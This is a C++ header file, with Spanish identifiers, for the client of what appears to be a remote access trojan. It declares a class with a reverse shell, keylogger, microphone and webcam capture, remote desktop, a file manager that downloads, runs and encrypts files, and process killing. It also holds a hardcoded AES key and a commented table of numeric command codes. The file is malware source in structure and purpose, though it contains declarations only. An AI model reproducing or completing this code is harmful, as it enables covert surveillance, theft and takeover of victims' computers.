#ifndef _CLIENTE_H
#define _CLIENTE_H

#include "headers.hpp"
#include "mod_mic.hpp"
#include "mod_keylogger.hpp"
#include "mod_camara.hpp"
#include "mod_remote_desktop.hpp"

struct Paquete {
	u_int uiTipoPaquete;
	u_int uiTamBuffer;
	u_int uiIsUltimo;
	char cBuffer[PAQUETE_BUFFER_SIZE];
};

class ReverseShell;
class Mod_Mic;


class Cliente {
	private:
		std::mutex sck_mutex;
		std::mutex mtx_shell;
		std::mutex mtx_running;
		std::mutex mtx_queue;
		std::mutex mtx_kill;

		std::thread p_thQueue;

		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };
		ByteArray bKey;
		void Init_Key();

		//Modulos
		ReverseShell*      reverseSHELL   = nullptr;
		Mod_Mic*           mod_Mic        = nullptr;
		mod_Keylogger*     mod_Key        = nullptr;
		mod_Camera*        mod_Cam        = nullptr;
		mod_RemoteDesktop* mod_RemoteDesk = nullptr;

		//Para recibir archivo (single)
		std::ofstream ssArchivo;
		FILE *fpArchivo = nullptr;

		//Queue para comandos recibidos
		std::queue<std::vector<char>> queue_Comandos;

		bool isRunning = true;
		bool isQueueRunning = true;
		bool isShellRunning = false;
		bool BLOCK_MODE = false;
		bool isKillSwitch = false;
		
	public:
		SOCKET sckSocket = INVALID_SOCKET;

		/*std::map<std::string, EnumComandos::Enum> Comandos = {
			{"498", EnumComandos::INIT_PACKET},
			{"499", EnumComandos::PONG},
			{"500", EnumComandos::PING},
			{"501", EnumComandos::Reverse_Shell_Start},
			{"502", EnumComandos::Reverse_Shell_Command},
			{"503", EnumComandos::Reverse_Shell_Salida},
			{"504", EnumComandos::Reverse_Shell_Finish},
			{"505", EnumComandos::Mic_Refre_Dispositivos},
			{"506", EnumComandos::Mic_Refre_Resultado},
			{"507", EnumComandos::Mic_Iniciar_Escucha},
			{"508", EnumComandos::Mic_Detener_Escucha},
			{"509", EnumComandos::Mic_Live_Packet},
			{"510", EnumComandos::FM_Discos},
			{"512", EnumComandos::FM_Dir_Folder},
			{"514", EnumComandos::FM_Crear_Folder},
			{"515", EnumComandos::FM_Crear_Archivo},
			{"516", EnumComandos::FM_Borrar_Archivo},
			{"517", EnumComandos::FM_Descargar_Archivo},
			{"518", EnumComandos::FM_Descargar_Archivo_Recibir},
			{"519", EnumComandos::FM_Descargar_Archivo_Init},
			{"520", EnumComandos::FM_Descargar_Archivo_End},
			{"521", EnumComandos::FM_Ejecutar_Archivo},
			{"522", EnumComandos::FM_Editar_Archivo},
			{"524", EnumComandos::FM_Editar_Archivo_Guardar},
			{"525", EnumComandos::FM_Crypt_Archivo},
			{"526", EnumComandos::PM_Refrescar},
			{"527", EnumComandos::PM_Kill},
			{"529", EnumComandos::KL_Iniciar},
			{"530", EnumComandos::KL_Detener},
			{"531", EnumComandos::KL_Salida},
			{"532", EnumComandos::CM_Lista},
			{"534", EnumComandos::CM_Single},
			{"536", EnumComandos::CM_Live_Start},
			{"537", EnumComandos::CM_Live_Stop},
			{"538", EnumComandos::FM_Crypt_Confirm},
			{"540", EnumComandos::RD_Single},
			{"541", EnumComandos::RD_Start},
			{"542", EnumComandos::RD_Stop},
			{"543", EnumComandos::RD_Salida},
			{"544", EnumComandos::RD_Update_Q},
			{"545", EnumComandos::RD_Update_Vmouse}
		};*/

		Cliente();
		~Cliente();
		
		//Misc
		std::string ObtenerDesk();
		std::string ObtenerDown();

		//Sockets
		bool bConectar(const char* cIP, const char* cPuerto);
		void CerrarConexion();

		//Socket wraps
		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
		void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
		void m_DeserializarPaquete(const char* cBuffer, Paquete& paquete);


		//AES
		ByteArray bDec(const unsigned char* pInput, size_t pLen);
		ByteArray bEnc(const unsigned char* pInput, size_t pLen);

		void iniPacket();

		void MainLoop();
		void Process_Queue();
		void Spawn_QueueMan();
		void Procesar_Comando(std::vector<char>& cBuffer);
		void DestroyClasses();

		bool m_isRunning() {
			std::unique_lock<std::mutex> lock(mtx_running);
			return isRunning;
		}

		void m_Stop() {
			std::unique_lock<std::mutex> lock(mtx_running);
			isRunning = false;
		}

		bool m_isQueueRunning() {
			std::unique_lock<std::mutex> lock(mtx_queue);
			return isQueueRunning;
		}

		void m_StopQueue() {
			std::unique_lock<std::mutex> lock(mtx_queue);
			isQueueRunning = false;
		}
};

class ReverseShell {
	private:
		Cliente* copy_ptr;
		std::mutex mutex_shell;
		bool isRunning = false;
		PROCESS_INFORMATION pi;
		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
		std::thread tRead;
	public:
		ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
		SOCKET sckSocket;
		bool SpawnShell(const char* pStrComando);
		void TerminarShell();

		void thEscribirShell(std::string pStrInput);
		void thLeerShell(HANDLE hPipe);
};

#endif
